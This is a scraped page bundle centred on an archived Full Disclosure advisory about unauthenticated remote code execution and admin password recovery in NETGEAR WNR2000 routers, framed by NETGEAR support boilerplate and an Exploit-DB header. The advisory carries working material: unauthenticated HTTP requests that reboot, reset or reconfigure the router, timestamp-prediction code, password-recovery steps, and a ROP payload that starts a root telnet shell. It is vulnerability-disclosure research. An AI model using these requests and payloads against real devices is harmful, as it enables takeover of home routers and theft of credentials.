Norwegian (Norsk)
Polish (polski)
Português
Romanian (Română)
Россия (русский)
Slovenčina
Slovenščina
Swedish (Svenska)
Greek (Ελληνικά)
Turkish (Türk)

#### Looking for more about your product?

Get information, documentation, videos and more for your specific product.

### Can’t find what you’re looking for?

Quick and easy solutions are available for you in the NETGEAR community.

[Ask the Community](https://community.netgear.com/t5/All-Communities/ct-p/English)

## Need to Contact NETGEAR Support?

With NETGEAR’s round-the-clock premium support, help is just a phone call away.

See Support Options

### Complimentary Support

NETGEAR provides complimentary technical support for NETGEAR products for 90 days from the original date of purchase.

[Contact Support](https://www.netgear.com/support/contact.aspx)

### NETGEAR Premium Support

###### GearHead Support for Home Users

GearHead Support is a technical support service for NETGEAR devices and all other connected devices in your home. Advanced remote support tools are used to fix issues on any of your devices. The service includes support for the following:

* Desktop and Notebook PCs, Wired and Wireless Routers, Modems, Printers, Scanners, Fax Machines, USB devices and Sound Cards
* Windows Operating Systems (2000, XP or Vista), MS Word, Excel, PowerPoint, Outlook and Adobe Acrobat
* Anti-virus and Anti-Spyware: McAfee, Norton, AVG, eTrust and BitDefender

[Learn More](https://gearhead.netgear.com/)

###### ProSUPPORT Services for Business Users

NETGEAR ProSUPPORT services are available to supplement your technical support and warranty entitlements. NETGEAR offers a variety of ProSUPPORT services that allow you to access NETGEAR's expertise in a way that best meets your needs:

* Product Installation
* Professional Wireless Site Survey
* Defective Drive Retention (DDR) Service

[Learn More](https://prosupport.netgear.com/)

### Where to Find Your Model Number

To find the model/version number, check the bottom or back panel of your NETGEAR device.

---

Select a product or category below for specific instructions.

[![](/resource/1658125676000/kbchat/images/model-number-popup/nrouter.png)
#### N Routers](/resource/1658125676000/kbchat/images/model-number-popup/NRouter_Lbl_Agile_1.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/nighthawk.png)
#### Nighthawk Routers](/resource/1658125676000/kbchat/images/model-number-popup/Nighthawk_Lbl_Agile_1.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/powerline.png)
#### Powerline and Wall Plug Extenders](/resource/1658125676000/kbchat/images/model-number-popup/Powerline_Lbl_Agile.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/cable-dsl.png)
#### Cable and DSL Modem Routers](/resource/1658125676000/kbchat/images/model-number-popup/Cable_Lbl_Agile.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/readynas.png)
#### ReadyNAS Network Storage](/resource/1658125676000/kbchat/images/model-number-popup/ReadyNAS_Lbl_Agile_1.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/switches.png)
#### Switches](/resource/1658125676000/kbchat/images/model-number-popup/Switch2_Lbl_Agile.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/accesspoint.png)
#### Wireless Access Points](/resource/1658125676000/kbchat/images/model-number-popup/AccessPoint_Lbl_Agile.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/others.png)
#### Other Business Products](/resource/1658125676000/kbchat/images/model-number-popup/VPN_Lbl_Agile.jpg)

[![](/resource/1658125676000/kbchat/images/model-number-popup/mobile-broadband.png)
#### Mobile Broadband](/resource/1658125676000/kbchat/images/model-number-popup/AirCard_Lbl_Agile.jpg)

[![NETGEAR logo](/resource/1658125676000/kbchat/images/netgear-logo.png)](https://www.netgear.com)

Feedback

* [Facebook](https://facebook.com/netgear "Facebook")
* [Twitter](https://twitter.com/netgear "Twitter")
* [Youtube](https://youtube.com/netgear "Youtube")

* United States (English)
  ![Country name](/resource/1658125676000/kbchat/images/us_flag.png)
  + [Deutschland (Deutsch)](https://www.netgear.de/support)
  + [España (Español)](https://www.netgear.es/support)
  + [France (Français)](https://www.netgear.fr/support)
  + [Italia (Italiano)](https://www.netgear.it/support)
  + [日本 (日本語)](https://www.netgear.jp/support)
  + [Netherlands (Dutch)](https://www.netgear.nl/support)
  + [United States (English)](https://www.netgear.com/support/)

© 1996-2025 ® [Terms and Conditions](https://www.netgear.com/about/terms-and-conditions/) [Privacy Policy](https://www.netgear.com/about/privacy-policy/)



=== Content from seclists.org_7c32b9c8_20250124_195702.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](71)
[By Date](date.html#72)
[![Next](/images/right-icon-16x16.png)](73)

[![Previous](/images/left-icon-16x16.png)](71)
[By Thread](index.html#72)
[![Next](/images/right-icon-16x16.png)](73)

![](/shared/images/nst-icons.svg#search)

# [0-day] RCE and admin credential disclosure in NETGEAR WNR2000

---

*From*: Pedro Ribeiro <pedrib () gmail com>

*Date*: Tue, 20 Dec 2016 22:42:03 +0100

---

```
Hi,

tl;dr
RCE in NETGEAR WNR2000 routers, exploitable over the LAN by default or
over the WAN if remote administration is enabled.
10.000 devices affected show up in Shodan - these are the ones with
remote admin enabled. There are likely tens of thousands of vulnerable
routers in private LANs as this device is extremely popular.

As usual, NETGEAR did not respond to any of my emails, so I'm releasing
this advisory and exploit code as a 0-day.
See [1] for the exploit code, but bear in mind it is only "alpha"
quality. A more robust exploit will be released in the next week and
sent upstream to Metasploit.

MITRE has not assigned any CVE numbers yet but I will keep trying to get
them. If they are not obtained then this vulnerability should be
referred with the BID / BugTraq number that will be assigned to it.

A copy of the advisory is in
<https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt>

Regards,
Pedro

```
> > ```
> > Stack buffer overflow vulnerability in NETGEAR WNR2000 router
> > Discovered by Pedro Ribeiro (pedrib () gmail com), Agile Information
> >
> > ```

```
Security
==========================================================================
Disclosure: 20/12/2016 / Last updated: 20/12/2016

```
> > ```
> > Background on the affected products:
> >
> > ```

```
"Wirelessly connect all of your computers and mobile devices. N300 WiFi
speed lets you simultaneously download, stream music and video, and game
online. NETGEAR genie® makes it easy to setup and monitor your network.
Parental controls keep your Internet experience safe and secure."

```
> > ```
> > Summary:
> >
> > ```

```
The NETGEAR WNR2000 allows an administrator to perform a number of
sensitive functions in the web interface through an apparent CGI script
named apply.cgi. This script is invoked when changing Internet settings,
WLAN settings, restore to factory defaults, reboot the router, etc.
However apply.cgi is not really a script, but a function that is invoked
in the HTTP server (uhttpd) when it receives that string in the URL.
When reversing uhttpd, it was found that it also allows an
unauthenticated user to perform the same sensitive admin functions if
apply_noauth.cgi is invoked instead.
Some of the functions, such as rebooting the router, can be exploited
straight away by an unauthenticated attacker. Other functions, such as
changing Internet, WLAN settings or retrieving the administrative
password, require the attacker to send a "timestamp" variable attached
to the URL. This timestamp is generated every time the target page is
accessed and functions as a sort of anti-CSRF token.
The timestamp generating function was reverse engineered and due to
incorrect use of random number generation (details below) it is possible
to identify the token in less than 1000 attempts with no other previous
knowledge.

By combining this knowledge with an information leakage, it is possible
to recover the administrator password. This password is then used to
enable telnet functionality in the router and obtain a root shell if the
attacker is in the LAN.

Finally, a stack buffer overflow was also discovered, which combined
with the apply_noauth.cgi vulnerability and the timestamp identifying
attack allows an unauthenticated attacker to take full control of the
device and execute code remotely. This vulnerability allows the attacker
to execute code in the LAN and in the WAN.

It should be noted that the WNR2000v5 does not have remote
administration enabled by default on the latest firmware, and unless the
administrator enables it, this attack is only possible in the LAN. Only
the WNR2000v5 device was tested, but versions 3 and 4 of this router
should also be vulnerable. At the time of the intial disclosure, there
are over 10.000 vulnerable routers appearing in a Shodan search.

Exploit code has been released with this advisory, but it is of "alpha"
quality (see [1]). This exploit code will be improved and ported to
Metasploit in the next week.

```
> > ```
> > Technical details:
> >
> > ```

```
#1
Vulnerability: Information leakage
NO CVE ASSIGNED
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. See below
for other constraints.
Affected versions:
- WNR2000v5, all firmware versions (confirmed in hardware)
- WNR2000v4, all firmware versions possibly affected (confirmed only by
static analysis)
- WNR2000v3, all firmware versions possibly affected (confirmed only by
static analysis)

The device leaks its serial number when performing a request to
http://<device_web_portal>/BRS_netgear_success.html:
HTTP/1.0 200 OK
Server: uhttpd/1.0.0
Date: Thu, 01 Jan 1970 00:11:42 GMT
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-Type: text/html; charset="UTF-8"
Connection: close

<html>
<head>
</head>
<body>
<script>
/* 22281: add sn after success href */
var sn="4D01615V0009D";                      <--- serial number of the
device
(...)

This vulnerability is useful for further exploitation in #2.

#2
Vulnerability: Improper access control
NO CVE ASSIGNED
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. See below
for other constraints.
Affected versions:
- WNR2000v5, all firmware versions (confirmed in hardware)
- WNR2000v4, all firmware versions possibly affected (confirmed only by
static analysis)
- WNR2000v3, all firmware versions possibly affected (confirmed only by
static analysis)

-----------------------
The vulnerability
-----------------------

The WNR2000 router allows an administrator to perform sensitive actions
by invoking the apply.cgi URL on the web server of the device. This
special URL is handled by the embedded web server (uhttpd) and processed
accordingly.
While reverse engineering uhttpd, it was discovered that another
function, apply_noauth.cgi allows an unauthenticated user to perform
sensitive actions on the device. For example, to reboot the router, the
following request can be sent:

====
POST /apply_noauth.cgi?/reboot_waiting.htm HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

submit_flag=reboot&yes=Yes
====

To reset to factory defaults:
====
POST /apply_noauth.cgi?/pls_wait_factory_reboot.html HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

submit_flag=factory
====

Change WLAN settings:
====
POST /apply_noauth.cgi?/WLG_wireless.htm HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 754

submit_flag=wlan&Apply=Apply&hidden_wlan_mode=&hidden_wlan_channel=&generate_flag=&old_length=&wl_sec_wpaphrase_len=17&wl_hidden_wpa_psk=somewifipassword&hidden_sec_type=&wep_press_flag=&wpa1_press_flag=0&wpa2_press_flag=1&wpas_press_flag=0&wps_change_flag=5&hidden_enable_guestNet=&hidden_enable_ssidbro=&hidden_allow_guest=&radiusServerIP=&opmode_bg=&wl_mode=&wl_ssid=1337Net&wl_WRegion=4&wl_hidden_wlan_channel=0&wl_hidden_wlan_mode=2&wl_hidden_sec_type=4&hidden_WpaeRadiusSecret=&hidden_WpaeRadiusSecret_a=&wl_enable_ssid_broadcast=1&hidden_enable_video=&wl_tx_ctrl=&wl_apply_flag=1&ssid_bc=1&ssid=NETGEAR09&wla1ssid=NETGEAR-5G_Guest1&wlg1ssid=NETGEAR-Guest&WRegion=4&w_channel=0&opmode=2&opmode54=1&security_type=WPA2-PSK&passphrase=somewifipassword
====

Change password recovery settings for the administrator account:
====
POST /apply_noauth.cgi?/PWD_password.htm%20timestamp=26123148 HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 188

submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=secretanswer1&question2=2&answer2=secretanswer2
====

These are just examples, there is a lot more functionality that can be
accessed using apply_noauth.cgi. However, apart from the three first
examples, most actions will require knowledge of a "timestamp" variable
which is appended to the URL (like in the fourth example). Identifying
this timestamp is non-trivial and will be explained in detail.

-----------------------
Timestamp generation
-----------------------

This timestamp variable is generated each time a user accesses a page.
For example, to change the WLAN settings, a user has to visit the
WLG_wireless.htm page. The timestamp variable will be generated when
that page is accessed, and stored in the device configuration.
Each time the page is visited, a new timestamp is generated and embedded
in the page. Even if the page has not been accessed by a user since the
device has rebooted, the timestamp variable will still be preset in the
configuration. It was not investigated why this occurs but most likely
this timestamp is generated and saved at some point in the boot process.
Note that each page or function will have a different timestamp at any
time, stored in the device configuration. It is also crucial to note
that an unauthenticated user cannot access any of the pages, so it
cannot force generation of a timestamp or retrieve its value.

The function responsible for this timestamp generation is at 0x4101E8
(firmware version 1.0.0.34 for the WNR2000v5) and it has a symbol name
of get_timestamp.
The following C code shows how the timestamp generation is done:

  long t0, t1, t2, t3, t4, hi;
  int i;
  float final;

  // seed srand with NULL is the same as seeding it with the current
UNIX system time
  srand(0);

  t0 = rand();
  t1 = 0x17dc65df;
  hi = (int)((t0 * t1) >> 32);
  t2 = t0 >> 31;
  t3 = hi >> 23;
  t3 = t3 - t2;
  t4 = t3 * 0x55d4a80;
  t0 = t0 - t4;
  t0 = t0 + 0x989680;

  final = (float) t0;
  printf("%9.f\n", final);

The final cast to float is crucial, as this will force the number to be
rounded using IEEE 754 rules, and will slightly increase or decrease the
final value. This is exactly what happens in the disassembled code, and
the C code above can generate timestamps with 100% accuracy.
Porting this code to Ruby (in order to release exploit code, see [1])
was a challenge. First, the behaviour of srand and rand in ruby is
completely different, so the actual libc functions had to be ported line
by line. Second, Ruby uses double precision floating point integers by
default, so pack and unpack had to be used in order to force single
precision float behaviour.

-----------------------
Achieving reliable exploitation
-----------------------

The unresolved problem for an unauthenticated attacker is that it needs
to guess the current timestamp value in order to perform any of the
attacks described above. This could be limited by first attempting all
possible values in the current hour, current day, current month, current
year in order.
However there is an optimal way to do it.

One of the few actions that is possible for an unauthenticated attacker
to execute without knowing the timestamp is to reboot the device. If the
device is rebooted, then the attacker will know that the UNIX time used
to seed srand and to generate the timestamp will be in the last 5
minutes or so (about the time it takes to reboot and for the attacker to
re-connect to it). Therefore, to easily guess the timestamp, all that
has to be done is the following:

a) send a reboot request
b) wait for the device to reboot and connect again to it (via WLAN or
Ethernet)
c) send a HTTP GET request to the device, and get its current time from
the Date HTTP header
d) using the algorithm above, seed srand with all possible values
starting from the UNIX timestamp obtained from parsing the Date header
minus 300 (60 seconds times 5 minutes)
e) attempt to perform the intended function (factory reset, change WLAN,
etc) by invoking the apply_noauth.cgi script with the correct parameters
and each output from d) until the correct timestamp is hit and the
function executed

Using this technique, the bruteforce needed to guess the timestamp is
greatly reduced, enabling an unauthenticated attacker to be successful
100% of the time (actual number of tries needed will vary approximately
between 300 and 5000, but usually less than 1000).

For WAN exploitation (when remote management is enabled) rebooting is
not an option (as most likely the device will have a new IP address
after boot); for this case, the best way to exploit the device is to
start from the current time backwards and keep sending requests until
the correct value is hit.

-----------------------
Obtaining the admin password
-----------------------

With the possibility of resetting the password recovery settings, the
attacker can now obtain the administrator password.
After a successful password recovery reset using the algorithm detailed
in "Achieving reliable exploitation", the attacker now has to:

a1) Send a POST request to unauth.cgi with the serial number
POST /apply_noauth.cgi?/unauth.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

submit_flag=match_sn&serial_num=<serial>&continue=+Continue+

b1) Send a POST request to securityquestions.cgi with the answer to the
security questions
POST /apply_noauth.cgi?/securityquestions.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

submit_flag=security_question&answer1=secretanswer1&answer2=secretanswer2&continue=+Continue+

c1) Finally, send a GET request to passwordrecovered.cgi and the admin
username and password will be displayed:
(...)
<TR><TD colSpan=2>You have successfully recovered the admin
password.</TD></TR>
<TR><TD colSpan=2>&nbsp;</TD></TR>
<TR >
        <TD nowrap
colSpan=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Router Admin
Username: admin</TD>
</TR>
<TR>
        <TD nowrap
colSpan=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Router Admin
Password: password</TD>
(...)

-----------------------
Executing code as root
-----------------------

NETGEAR routers have a handy function that allows a user to enable a
root console via telnet with a special magic packet. This magic packet
is calculated with the MAC of the device, plus the administrator
username and password, which is then MD5 hashed and Blowfish encrypted
with "AMBIT_TELNET_ENABLE+" plus the password. For more details, see [2].

Given that the its possible to retrieve the administator username and
password as explained above, in order to execute code all that is needed
is to send the magic packet with the script in [3], and connect to port
23 to land in a root shell with no futher authentication required.

All of the above assumes the administrator password has been changed. If
it hasn't, the executing code as root is trivial with the telnetenable
script in [3].

#3
Vulnerability: Stack buffer overflow
NO CVE ASSIGNED
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. See below
for other constraints.
Affected versions:
- WNR2000v5, all firmware versions (confirmed in hardware)
- WNR2000v4, all firmware versions possibly affected (confirmed only by
static analysis)
- WNR2000v3, all firmware versions possibly affected (confirmed only by
static analysis)

-----------------------
Vulnerability details
-----------------------

The HTTP server in the device (uhttpd) handles access to *.cgi files in
a special way. Instead of fetching a CGI file from the file system, it
handles them internally according to the URL. This mechanism has already
been described in vulnerability #2 and in the Summary section.
A key parameter of the apply*.cgi URL is the submit_flag, which will
determine which uhttpd function will be invoked when processing the request.

If the following request is sent:
POST /apply.cgi?/lang_check.html%20timestamp=14948715 HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Content-Type: application/x-www-form-urlencoded
Content-Length: 604

submit_flag=select_language&hidden_lang_avi=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDDDDEEEEFFFFbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

A stack buffer overflow occurs, which can be seen when debugging the
process in gdb:
Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) i r
          zero       at       v0       v1       a0       a1       a2
  a3
 R0   00000000 00000001 00000000 00000054 00000000 7fae7ee1 ffffff87
000009c0
            t0       t1       t2       t3       t4       t5       t6
  t7
 R8   2ab96420 00000000 00000001 fffffff8 fffffffe 00000001 00000000
00000000
            s0       s1       s2       s3       s4       s5       s6
  s7
 R16  41414141 42424242 43434343 44444444 00000002 00000025 0000002b
00000002
            t8       t9       k0       k1       gp       sp       s8
  ra
 R24  00000002 2ab5a170 2ab825f8 00000000 0048f4a0 7fae7f18 004b51b8
45454545
        status       lo       hi badvaddr    cause       pc
      0000ff13 000f41db 000003dd 45454544 10800008 45454545
          fcsr      fir  restart
      00000000 00000000 00000000
(gdb) x/32xw $sp
0x7fae7f18:     0x46464646      0x62626262      0x62626262      0x62626262
(...)

The following registers can be controlled by an attacker:
$ra/$pc = index 52 of hidden_lang_avi parameter (EEEE)
$s0 = index 36 (AAAA)
$s1 = index 40 (BBBB)
$s2 = index 44 (CCCC)
$s3 = index 48 (DDDD)
$sp = index 56 (FFFF)

This vulnerability will be analysed using firmware 1.0.0.34 for the
WNR2000v5 router.
The function at address 0x446428 is invoked to process the
hidden_lang_avi parameter. This function extracts the parameter and then
processes it as shown in a snippet below:
(...)
LOAD:00446510                 la      $t9, strcpy
LOAD:00446514                 addiu   $s1, $sp, 0x48+hidden_lang_avi_var
LOAD:00446518                 move    $a1, hidden_lang_avi_str #
hidden_lang_avi_str = $s0, obtained from the cgi value
LOAD:0044651C                 jalr    $t9 ; strcpy     # first overflow
occurs here
LOAD:0044651C                                          # - copies
hidden_lang_avi cgi param to hidden_lang_avi_var
LOAD:00446520                 move    $a0, $s1
LOAD:00446524                 b       loc_4464C4
(snippet of function starting at 0x446428)

As it can be seen, an overflow occurs here, but upon further
investigation this is not actually where the crash occurs.
Following the branch instruction, we then go to:
LOAD:004464C4 loc_4464C4:
LOAD:004464C4                 la      $t9, config_set
LOAD:004464C8                 lui     $a0, 0x47  # 'G'
LOAD:004464CC                 move    $a1, $s1            # $s1 points
to the stack variable seen in the previous snippet as "hidden_lang_avi_var"
LOAD:004464D0                 jalr    $t9 ; config_set
LOAD:004464D4                 la      $a0, aNew_language  # "New_Language"
LOAD:004464D8                 jal     check_language_file
LOAD:004464DC                 move    $a0, $s1
(snippet of function starting at 0x446428)

The hidden_lang_avi_var string is then passed to check_language_file as
the first parameter. This function does some further processing, but
then passes it on to another function, region_search, again as the first
parameter:
LOAD:004463DC loc_4463DC:
LOAD:004463DC                 la      $t9, region_search
LOAD:004463E0                 jalr    $t9 ; region_search
LOAD:004463E4                 move    $a0, $s0    # $s0 contains the
hidden_lang_avi_var passed on from 0x446428
(snippet of function check_language_file)

Which finally leads us to the function where the overflow occurs,
region_search:
LOAD:004130B0 region_search:
LOAD:004130B0
LOAD:004130B0                 lui     $gp, 0x49  # 'I'
LOAD:004130B4                 addiu   $sp, -0x50
LOAD:004130B8                 la      $gp, unk_48F4A0
LOAD:004130BC                 sw      $ra, 0x50+var_4($sp)
LOAD:004130C0                 sw      $s3, 0x50+var_8($sp)
LOAD:004130C4                 sw      $s2, 0x50+var_C($sp)
LOAD:004130C8                 sw      $s1, 0x50+var_10($sp)
LOAD:004130CC                 sw      $s0, 0x50+var_14($sp)
LOAD:004130D0                 sw      $gp, 0x50+var_40($sp)
LOAD:004130D4                 beqz    $a0, loc_4131F0
LOAD:004130D8                 la      $t9, strcpy
LOAD:004130DC                 addiu   $s2, $sp, 0x50+var_38   # stack
variable which will be overflown
LOAD:004130E0                 move    $a1, $a0                # $a0, AKA
hidden_lang_avi_var from 0x446428
LOAD:004130E4                 lui     $s3, 0x48  # 'H'
LOAD:004130E8                 jalr    $t9 ; strcpy            # second
overflow occurs here
LOAD:004130EC                 move    $a0, $s2
(snippet of region_search)

As it can be seen above, a stack variable which is located at an offset
of 0x38 is the one overflown and it is in this function that the crash
shown in gdb above occurs. The first register we control, $s0, has its
value stored at offset 0x14, which is stored in the stack 0x24 (36)
bytes from the stack variable that gets overwritten.

Note that this vulnerability can be exploited by an authenticated
attacker (via the apply.cgi URL) or by an unauthenticated attacker that
knows the timestamp parameter (via the apply_noauth.cgi parameter, and
using the technique described in #1 to know the timestamp).

-----------------------
Exploitation
-----------------------

The NETGEAR WNR2000 is a MIPS device, and it does not have ASLR or NX,
so this vulnerability can be exploited to execute shellcode on the stack.
MIPS Cores have separate instruction and data caches so that an
instruction can be read and a load or store done simultaneously [4].
Usually when writing MIPS exploits, one has to flush the caches before
executing any shellcode that has been injected (see [4] for another
example). There are at least six ways to achieve this:

i) Use pure ROP / return-to-libc
When using only ROP / ret-to-libc, the stack will simply be used to
store data (where the next instruction is). The instructions used to
execute code are already part of the program, and no modification of
them is done. For this reason, there is no need to flush the caches when
using pure ROP (as in no code in the stack is executed) or return-to-libc.

ii) call libc's sleep()

iii) call libc's cacheflush()

iv) invoke MIPS cacheflush syscall (Linux example)
  li      $v0, 0x1033     ; load $v0 with the syscall number
  syscall 0

v) issue instructions to flush the cache directly (kernel mode only, see
[6], page 2; see also [4] (page 12-24))

vi) Put the shellcode in the kseg1 memory segment (kernel mode only)
This is in the memory range 0xa0000000 to 0xc0000000. For more details
check [6].

In order to reduce exploit complexity, approach i) will be taken,
eliminating both the need to flush the cache and the need to write
shellcode. The system() function can be invoked to start telnetd,
download and execute a file with wget, etc.

All firmware versions for the WNR2000v5 appear to use
libuClibc-0.9.30.1.so, which makes gadget hunting easier. In this
device, uClibc is loaded at a fixed address of 0x2AB24000, which makes
it easy to write an exploit for all firmware versions. Luckily, only one
gadget was needed to perform the attack.

The ROP gadget will load $sp into $a0 (which will contain the system()
command) and call $s0 (which will contain the address of system()):
LOAD:0002462C                 addiu   $a0, $sp, 0x40+arg_0
LOAD:00024630                 move    $t9, $s0
LOAD:00024634                 jalr    $t9

The stack needs to be set up in the following way:
payload =
  'a' * 36      +
     # filler (trash the stack until we hit $s0)
  system()      +
     # $s0
  '1111'        +
     # $s1
  '2222'        +
     # $s2
  '3333'        +
     # $s3
  gadget        +
     # gadget
  'b' * 0x40    +
     # filler (discard these bytes because of gadget)
  "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l
/bin/sh"  # payload

This payload will have the final value of:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%2a%b7%87%d0111122223333%2a%b4%86%2cbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbkillall
telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh

The payload is then sent in the hidden_lang_avi parameter which will
then result in the telnetd server being started on port 23, running as
root with no authentication. By simply connecting to port 23 a root
shell is presented.
The only constraints for the payload is that it should not contain
ampersand (&), percentage (%) or null characters. The uhttpd server will
die after this attack is performed, but it is restarted by a watchdog
every couple of minutes.

```
> > ```
> > Fix:
> >
> > ```

```
NETGEAR did not respond to any emails, so THERE IS NO FIX for this
vulnerability.
It is recommended to replace this router with another make and model
that supports OpenWRT firmware.

Timeline of disclosure:
26.09.2016: Email sent to NETGEAR (security () netgear com) asking for PGP
key, no response.
28.10.2016: Email sent to NETGEAR (security () netgear com) asking for PGP
key, no response.
26.11.2016: Disclosed vulnerability to CERT through their web portal.
29.11.2016: Received reply from CERT. They indicated that NETGEAR does
not cooperate with them, so they recommended getting CVE numbers from
MITRE and releasing the vulnerability information
            Email to MITRE requesting CVE numbers, no response.
            Email sent to NETGEAR (security () netgear com) asking for PGP
key, no response.
20.12.2016: Public disclosure.

```
> > ```
> > References:
> >
> > ```

```
[1]
<https://raw.githubusercontent.com/pedrib/PoC/master/exploits/netgearPwn.rb>
[2] <https://wiki.openwrt.org/toh/netgear/telnet.console>
[3] <https://github.com/insanid/netgear-telenetenable>
[4]
<http://cdn.imgtec.com/mips-training/mips-basic-training-course/slides/Caches.pdf>
[5]
<https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt>
[6]
<http://cdn.imgtec.com/mips-training/mips-basic-training-course/slides/Memory_Map.pdf>

================
Agile Information Security Limited
<http://www.agileinfosec.co.uk/>

```
> > ```
> > Enabling secure digital business >>
> >
> > ```

```

```

**Attachment:
[signature.asc](att-72/signature_asc.bin)**

*Description:* OpenPGP digital signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](71)
[By Date](date.html#72)
[![Next](/images/right-icon-16x16.png)](73)

[![Previous](/images/left-icon-16x16.png)](71)
[By Thread](index.html#72)
[![Next](/images/right-icon-16x16.png)](73)

### Current thread:

* **[0-day] RCE and admin credential disclosure in NETGEAR WNR2000** *Pedro Ribeiro (Dec 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_b9434be1_20250124_195704.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Netgear WNR2000v5 - 'hidden\_lang\_avi' Remote Stack Overflow (Metasploit)

#### EDB-ID:

###### 41719

#### CVE:

###### [2016-10174](https://nvd.nist.gov/vuln/detail/CVE-2016-10174)

---

**EDB Verified:**

#### Author:

